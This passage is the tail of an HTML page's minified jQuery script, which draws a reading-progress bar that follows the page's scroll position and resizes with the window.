document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>